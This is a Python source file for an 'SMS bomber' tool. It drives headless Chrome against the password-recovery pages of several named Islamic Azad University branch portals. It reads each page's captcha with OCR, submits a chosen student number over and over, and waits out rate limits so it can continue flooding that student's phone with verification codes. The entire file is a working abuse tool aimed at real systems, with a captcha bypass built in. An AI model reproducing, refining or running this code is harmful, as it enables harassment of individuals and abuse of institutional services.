import os
import re
import sys
import time
import signal
import warnings
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from PIL import Image
import pytesseract
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn, SpinnerColumn
from rich.table import Table
from rich.text import Text

warnings.filterwarnings("ignore", category=DeprecationWarning)

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)


class SMSBomber:
    def __init__(self, vadana_url):
        self.chrome_options = webdriver.ChromeOptions()
        self.chrome_options.add_argument("--headless=new")
        self.chrome_options.add_argument("--no-sandbox")
        self.chrome_options.add_argument("--disable-gpu")
        self.chrome_options.add_argument("--disable-dev-shm-usage")
        self.chrome_options.add_argument("--window-size=1024,768")
        self.chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
        
        self.driver = None
        self.vadana_url = vadana_url
        
        pytesseract.pytesseract.tesseract_cmd = resource_path('tesseract')

    def start_driver(self):
        if self.driver is None:
            try:
                service = Service(executable_path=resource_path('chromedriver'))
                self.driver = webdriver.Chrome(service=service, options=self.chrome_options)
                self.driver.set_page_load_timeout(10)
            except Exception:
                return "[bold red]Error: WebDriver could not be started.[/bold red]"
        return None

    def stop_driver(self):
        if self.driver is not None:
            self.driver.quit()
            self.driver = None
        for file in ["full_screenshot.png", "captcha_image.png"]:
            if os.path.exists(file):
                try:
                    os.remove(file)
                except OSError:
                    pass
    
    def solve_captcha(self):
        try:
            captcha_element = self.driver.find_element(By.XPATH, "//label[@id='captcha-label']/img")
            captcha_element.screenshot("captcha_image.png")
            image = Image.open("captcha_image.png")
            
            image = image.convert('L')
            threshold = 128
            binary_image = image.point(lambda x: 0 if x < threshold else 255, '1')
            
            tessdata_dir_config = f'--tessdata-dir "{resource_path("tessdata")}"'
            config = f'--psm 7 --oem 3 -c tessedit_char_whitelist=0123456789 {tessdata_dir_config}'
            
            captcha_text = pytesseract.image_to_string(binary_image, config=config).strip()
            
            if len(captcha_text) >= 4:
                return captcha_text
            else:
                return None
        except Exception:
            return None

    def recover_password(self, student_number):
        try:
            self.driver.get(self.vadana_url)
            self.driver.find_element(By.NAME, "username").send_keys(student_number)
            
            captcha_text = self.solve_captcha()
            if captcha_text:
                self.driver.find_element(By.NAME, "captcha").send_keys(captcha_text)
            
            self.driver.find_element(By.ID, "loginBtn").click()
            time.sleep(1.5) 
            try:
                self.driver.find_element(By.XPATH, "//div[@id='login-alert-section']/div[contains(@class, 'alert-success')]")
                return True, "[bold green]Success![/bold green] Verification code sent."
            except NoSuchElementException:
                try:
                    error_element = self.driver.find_element(By.XPATH, "//div[contains(@class, 'alert-danger')]")
                    error_text = error_element.text
                    if "کد امنیتی نامعتبر است" in error_text or "Invalid security code" in error_text.lower():
                        return False, "[bold red]Failed:[/bold red] Invalid Captcha."
                    elif "محدودیت" in error_text or "limit" in error_text.lower():
                        return False, "[bold yellow]Rate Limited.[/bold yellow] Waiting..."
                    else:
                        return False, "[bold red]Failed:[/bold red] Unknown error from site."
                except NoSuchElementException:
                    return False, "[yellow]Unknown response from server.[/yellow]"

        except TimeoutException:
            return False, "[bold red]Error:[/bold red] Page failed to load. Check URL/connection."
        except Exception:
            return False, "[bold red]Error:[/bold red] An unexpected error occurred."


def display_system_menu(console):
    systems = {
        1: {"name": "IAU Central Tehran Branch", "url": "https://vadana46.ec.iau.ir/p/4032/login/recover_password.php"},
        2: {"name": "IAU North Tehran Branch", "url": "https://vadana52.ec.iau.ir/p/4032/login/recover_password.php"},
        3: {"name": "IAU East Tehran Branch", "url": "https://vadana36.ec.iau.ir/p/4032/login/recover_password.php"},
        4: {"name": "IAU West Tehran Branch", "url": "https://vadana13.ec.iau.ir/p/4032/login/recover_password.php"},
        5: {"name": "IAU Yadegar Imam Branch", "url": "https://vadana31.ec.iau.ir/p/4033/login/recover_password.php"},
        6: {"name": "IAU Parand Branch", "url": "https://vadana16.ec.iau.ir/p/4033/login/recover_password.php"},
        7: {"name": "IAU Ghods City Branch", "url": "https://vadana33.ec.iau.ir/p/4033/login/recover_password.php"},
        8: {"name": "IAU Shahryar Branch", "url": "https://vadana37.ec.iau.ir/p/4033/login/recover_password.php"},
        9: {"name": "Manual", "url": None}
    }
    console.print("\n[cyan]Select a system:[/cyan]")
    for key, system in systems.items():
        console.print(f"[yellow]{key}.[/yellow] {system['name']}")
    while True:
        try:
            choice = int(console.input("\n[cyan][?] Enter your choice: [/cyan]"))
            if choice in systems:
                selected_system = systems[choice]
                if choice == 9:
                    return console.input("[cyan][?] Enter custom Vadana URL: [/cyan]").strip()
                return selected_system["url"]
            else:
                console.print("[red][!] Invalid choice.[/red]")
        except ValueError:
            console.print("[red][!] Please enter a valid number.[/red]")

def main():
    console = Console()
    log_messages = []

    def add_log(message):
        max_logs = 5 
        log_messages.append(f"[[dim]{time.strftime('%H:%M:%S')}[/dim]] {message}")
        if len(log_messages) > max_logs:
            log_messages.pop(0)

    console.print("[bold magenta]\n===== Vada-Bomber =====[/bold magenta]")
    console.print("[yellow][*] Press Ctrl+C to stop[/yellow]")
    
    vadana_url = display_system_menu(console)
    student_number = console.input("[cyan][?] Please enter the student number: [/cyan]")
    try:
        max_attempts = int(console.input("[cyan][?] Enter maximum attempts (default: 100): [/cyan]") or "100")
    except ValueError:
        max_attempts = 100

    os.system('cls' if os.name == 'nt' else 'clear')
    
    # --- ASCII Banner ---
    ascii_art = r"""
██╗   ██╗ █████╗ ██████╗  █████╗
██║   ██║██╔══██╗██╔══██╗██╔══██╗
██║   ██║███████║██║  ██║███████║
╚██╗ ██╔╝██╔══██║██║  ██║██╔══██║
 ╚████╔╝ ██║  ██║██████╔╝██║  ██║
  ╚═══╝  ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝
██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗
██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
            by Zodiac (github.com/Zudiaq)
"""
    console.print(ascii_art, style="cyan")
    # ------------------

    bomber = SMSBomber(vadana_url)
    
    error_msg = bomber.start_driver()
    if error_msg:
        console.print(error_msg)
        return

    progress = Progress(
        SpinnerColumn(style="bold magenta"),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=None, style="bold blue"),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TimeElapsedColumn(),
        TimeRemainingColumn(),
    )
    task = progress.add_task("[cyan]Sending Requests...", total=max_attempts)
    
    log_panel = Panel(
        Text("\n".join(log_messages)), 
        title="[bold yellow]Logs[/bold yellow]", 
        border_style="dim"
    )

    layout = Table.grid(expand=True)
    layout.add_row(progress)
    layout.add_row(log_panel)

    should_exit = False
    def signal_handler(sig, frame):
        nonlocal should_exit
        should_exit = True

    signal.signal(signal.SIGINT, signal_handler)
    
    success_count = 0
    attempt_count = 0
    
    try:
        with Live(layout, console=console, screen=False, redirect_stderr=False, vertical_overflow="visible") as live:
            while not should_exit and attempt_count < max_attempts:
                if should_exit: break
                attempt_count += 1
                
                result, message = bomber.recover_password(student_number)
                add_log(message)
                
                if result:
                    success_count += 1
                
                progress.update(task, advance=1, description=f"[cyan]Sending... ([bold green]{success_count}[/bold green] Success)")
                log_panel.renderable = Text("\n".join(log_messages), justify="left")
                
                if "Rate Limited" in message:
                    add_log("[yellow]Waiting for 30 seconds...[/yellow]")
                    for _ in range(30):
                        if should_exit: break
                        time.sleep(1)

    finally:
        if should_exit:
            add_log("[yellow]Process stopped by user.[/yellow]")
            console.print("\n[yellow][*] Process interrupted by user.[/yellow]")

        console.print("[yellow][*] Cleaning up...[/yellow]")
        bomber.stop_driver()
        console.print(f"[bold green][*] Finished. Total Attempts: {attempt_count}, Successful: {success_count}[/bold green]")

if __name__ == "__main__":
    main()
